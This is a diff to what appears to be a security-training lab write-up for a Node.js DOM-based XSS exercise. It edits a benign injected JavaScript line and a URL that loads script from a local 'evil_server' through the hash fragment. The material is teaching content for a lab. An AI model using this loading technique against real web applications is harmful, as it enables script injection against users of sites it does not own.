@@ -80,7 +80,7 @@ $ pip3 install flask
 Now we need to create our malicous js file, save the following snippet code into /static/js/welcome.js
 
 ```javascript
-document.getElementsByClassName("panel-body")[0].innerText = "pwned!!!";
+document.getElementsByClassName("panel-body")[0].innerText = "XSS-DOM-2";
 ```
 
 We are ready to start our server:
@@ -94,7 +94,7 @@ $ python3 evil_server.py
 Now we can serve our malicious js file to the application
 
 ```text
-http://localhost:5000/#xxxxhttp://localhost:1337
+http://0.0.0.0:5000/#xxxxhttp://0.0.0.0:1337
 ```
 
 ![](../../.gitbook/assets/nodejs/XSS-DOM-2/3.png)
